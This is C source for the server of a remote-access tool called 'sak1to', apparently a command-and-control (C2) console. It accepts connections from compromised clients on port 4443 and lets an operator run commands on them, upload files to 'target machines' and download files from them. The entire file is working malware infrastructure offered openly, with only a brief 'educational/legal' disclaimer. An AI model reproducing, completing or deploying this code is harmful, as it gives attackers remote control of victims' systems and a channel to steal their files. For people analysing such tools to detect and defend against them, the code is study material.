/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h> 
#include <pthread.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "headers/sakito_core.h"
#include "headers/sakito_server_tools.h"

#define PORT 4443
#define MEM_CHUNK 5

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;

void host_chdir(Server_map *s_map) {
	if (chdir(s_map->buf+3) == FAILURE) 
		if (errno) 
			printf("%s: %s\n", s_map->buf+3, strerror(errno));
}

void terminate_server(int listen_socket, const char* const error) {
	close(listen_socket);
	int err_code = EXIT_SUCCESS;
	if (error) {
		err_code = 1;
		perror(error);
	}

	exit(err_code);
}

void terminate_console(Server_map *s_map) {
	// Quit accepting connections.
	pthread_cancel(s_map->acp_thread);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) {
		for (size_t i = 0; i < s_map->clients_sz; i++)
			close(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	terminate_server(s_map->listen_socket, NULL);
}
 
// Function to create socket.
int create_socket() {
	// Create the server socket object.
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) {
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}
 
// Function to bind socket to specified port.
void bind_socket(int listen_socket) {
	// Create sockaddr_in structure.
	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET; 
	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
	serv_addr.sin_port = htons(PORT); 

	// Bind ip address and port to listen_socket
	if (bind(listen_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) 
		terminate_server(listen_socket, "Socket bind failed.\n");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "Placing socket into listening state failed.\n");
}

void add_client(Server_map* s_map, char* const host, int client_socket) {
	// If delete_client() is executing: wait for it to finish modifying s_map->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	if (s_map->clients_sz == s_map->clients_alloc)
		s_map->clients = realloc(s_map->clients, (s_map->clients_alloc += MEM_CHUNK) * sizeof(Conn));

	// When THRD_FLAG evaluates to 0: execution has ended.
	while (s_map->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);

	// Set race condition flag to communicate with delete_client().
	s_map->THRD_FLAG = 1;

	// Add hostname string and client_socket file descriptor to s_map->clients structure.
	s_map->clients[s_map->clients_sz].host = host;
	s_map->clients[s_map->clients_sz].sock = client_socket;
	s_map->clients_sz++;

	// Unlock/release mutex..
	pthread_mutex_unlock(&lock);

	// Execution is finished so allow delete_client() to continue.
	s_map->THRD_FLAG = 0;
}
 
// Thread to recursively accept connections.
void* accept_conns(void* param) {
	// Assign member values to connection map object/structure.
	Server_map* s_map = param;
	s_map->clients_alloc = MEM_CHUNK;
	s_map->clients_sz = 0;
	s_map->clients = malloc(s_map->clients_alloc * sizeof(Conn));
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);
 
	while (1) {
		// Wait for a connection.
		struct sockaddr_in client;
		int client_sz = sizeof(client);
 
		// Client socket object.
		int client_socket = accept(s_map->listen_socket, (struct sockaddr*)&client, &client_sz); 
		if (client_socket < 0)
			terminate_server(s_map->listen_socket, "Error accepting client connection.\n");

		// Client's remote name and client's ingress port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (getnameinfo((struct sockaddr*)&client, client_sz, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// Add client oriented data to s_map object.
		add_client(s_map, host, client_socket);
	}
}


// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, int client_socket) {
	// Open file.
	int fd = open(buf+8, O_RDONLY);
 
	// If the file exists or permission denied:
	if (fd < 1) {
		puts("File not found or permission denied.\n");

		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
		if (write(client_socket, "6", 1) < 1)
			return SOCKET_ERROR;

		return FILE_NOT_FOUND;
	}

	// '3' is the command code for uploading a file to the client's file-system.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (write(client_socket, buf+7, cmd_len) < 1)
		return SOCKET_ERROR;

	// Receive file transfer start byte to prevent received data from overlapping.
	if (read(client_socket, buf, 1) < 1)
		return SOCKET_ERROR;

	// Calculate file size and serialize the file size integer.
	int32_t f_size = (int32_t)lseek(fd, 0, SEEK_END);
	uint32_t bytes = htonl(f_size);

	// Send the serialized file size bytes.
	if (write(client_socket, (char*)&bytes, sizeof(uint32_t)) < 1)
		return SOCKET_ERROR;
 
	// Initialize i_result as true.
	int i_result = SUCCESS;

	if (f_size) {
		// Return file descriptor to start of file.
		lseek(fd, 0, SEEK_SET);

		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		int bytes_read;
		while ((i_result > 0) && (bytes_read = read(fd, buf, BUFLEN))) {
			// Send file's bytes chunk to remote server.
			i_result = write(client_socket, buf, bytes_read);
		}
		// Close the file.
		close(fd);
	}
 
	return i_result;
}
 
// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
	// '4' is the command code for downloading a file from the client's file-system.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (write(client_socket, buf+9, cmd_len) < 1)
		return SOCKET_ERROR;
 
	// Receive serialized file size int32_t bytes.
	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
		return SOCKET_ERROR;
 
	// Deserialize file size bytes.
	int32_t f_size = ntohl_conv(&*(buf));

	// Initialize i_result to true/1
	int i_result = SUCCESS;

	if (f_size != FAILURE) {
		// Open the file.
		int fd = open(buf+10, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
		if (f_size > 0) {
			// Varaible to keep track of downloaded data.
			int32_t total = 0;
			do
				i_result = read(client_socket, buf, BUFLEN);
			while ((i_result > 0)
					&& (write(fd, buf, i_result))
					&& ((total += i_result) != f_size));
		}
		if (fd)
			close(fd);
	}
	else {
		puts("The client's system cannot find the file specified.\n");
	}
 
	// Send byte indicating file transfer has finished to prevent overlapping received data.
	if (write(client_socket, FTRANSFER_FINISHED, 1) < 1)
		return SOCKET_ERROR;

	return i_result;
}
 
// Function send change directory command to client.
int client_chdir(char* const buf, const size_t cmd_len, int client_socket) {
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (write(client_socket, buf+3, BUFLEN) < 1)
		return SOCKET_ERROR;

	// Receive _chdir() result.
	if (read(client_socket, buf, 1) < 1)
		return SOCKET_ERROR;

	if (buf[0] == '0')
		puts("The client's system cannot find the path specified.\n");
 
	return SUCCESS;
}
 
// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, int client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	write(client_socket, "2", cmd_len);
 
	return EXIT_SUCCESS;
}

// Function to terminate/kill client.
int background_client(char* const buf, const size_t cmd_len, int client_socket) {
	// '5' is the command code for backgrounding the client.
	if (write(client_socket, "5", 1) < 1)
		return SOCKET_ERROR;

	return BACKGROUND;
}

// Function to send command to client to be executed via CreateProcess() and receive output.
int client_exec(char* const buf, const size_t cmd_len, int client_socket) {
 	buf[0] = '0';
	// Send command to server.
	if (write(client_socket, buf, cmd_len) < 1)
		return SOCKET_ERROR;

	memset(buf, '\0', BUFLEN);

	// Receive command output stream and write output chunks to stdout.
	while (1) {
		if (read(client_socket, buf, sizeof(uint32_t)) < 1)
			return SOCKET_ERROR;

		int32_t chunk_size = ntohl_conv(&*(buf));

		if (chunk_size == 0)
			break;

		if (read(client_socket, buf, chunk_size) < 1)
			return SOCKET_ERROR;

		if (write(STDOUT_FILENO, buf, chunk_size) == FAILURE) {
			fprintf(stderr, "Error calling WriteFile in client_exec() function: %s\n", strerror(errno));
			return FAILURE;
		}

	}

	// Write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return SUCCESS;
}

// Function to resize s_map array/remove and close connection.
void delete_client(Server_map* s_map, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying s_map->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	// Wait for accept_conns() to finish modifying s_map->clients.
	while (s_map->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);	

	// Set our thread flag to prevent a race condition from occurring with accept_conns().
	s_map->THRD_FLAG = 1;

	// If the file descriptor is open: close it.
	if (s_map->clients[client_id].sock)
		close(s_map->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure's member values.
	if (s_map->clients_sz > 1) {
		int max_index = s_map->clients_sz-1;
		for (size_t i = client_id; i < max_index; i++) {
			s_map->clients[i].sock = s_map->clients[i + 1].sock;
			s_map->clients[i].host = s_map->clients[i + 1].host;
		}
		s_map->clients[max_index].sock = 0;
		s_map->clients[max_index].host = NULL;
	}

	s_map->clients_sz--;

	// Unlock/release our mutex.
	pthread_mutex_unlock(&lock);

	// Allow accept_conns() to continue.
	s_map->THRD_FLAG = 0;
	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
}

int validate_id(Server_map *s_map) {
	int client_id;
	client_id = atoi(s_map->buf+9);

	if (!s_map->clients_sz || client_id < 0 || client_id > s_map->clients_sz - 1)
		return FAILURE;
	else
		return client_id;
}


// Function to parse interactive input and send to specified client.
void interact(Server_map* s_map) {
	int client_id = validate_id(s_map);

	if (client_id == -1) {
		puts("Invalid client identifier.");
		return;
	}

	// Send initialization byte to client.
	int i_result = write(s_map->clients[client_id].sock, INIT_CONN, 1);

	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		// Receive current working directory.
		if (read(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
			break;

		printf("┌%d─%s\n└%s>", client_id, s_map->clients[client_id].host, s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);
	
		// Array of command strings to parse stdin with.
		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };

		// Function pointer array of each c2 command.
		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client};

		// Parse and execute command function.
		size_t cmd_len = 0;
		const server_func target_func = (const server_func)parse_cmd(s_map->buf+1,
									&cmd_len,
									5,
									commands,
									func_array,
									&client_exec);

		i_result = target_func(s_map->buf, cmd_len+1, s_map->clients[client_id].sock);

		if (i_result == BACKGROUND)
			return;
	}
 
	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(s_map, client_id);
}

// Function to execute command.
void exec_cmd(Server_map *s_map) {
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(s_map->buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do {
		rb = fread(s_map->buf, 1, BUFLEN, fpipe);
		fwrite(s_map->buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Write single newline character to stdout for cmd line output alignment.
	fputc('\n', stdout);
 
	// Close the pipe.
	pclose(fpipe);
}

void sakito_console(Server_map *s_map) {
	// Saktio console loop.
	while (1) {
		getcwd(s_map->buf, BUFLEN);
		printf("sak1to-console:~%s$ ", s_map->buf);
		
		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[4][11] = { "cd ", "exit", "list", "interact " };

		// Function pointer array of each c2 command.
		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact};

		// Parse and execute command function.
		size_t cmd_len = 0;
		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
									 &cmd_len,
									 4,
									 commands,
									 func_array,
									 &exec_cmd);

		target_func(s_map);
	}
}

// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	// Instantiate a Server_map structure.
	Server_map s_map;

	// Set out race condition flag to false.
	s_map.THRD_FLAG = 0;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&s_map.acp_thread , NULL, accept_conns, &s_map);

	// Initiate sakito console.
	sakito_console(&s_map);

	return FAILURE;
}
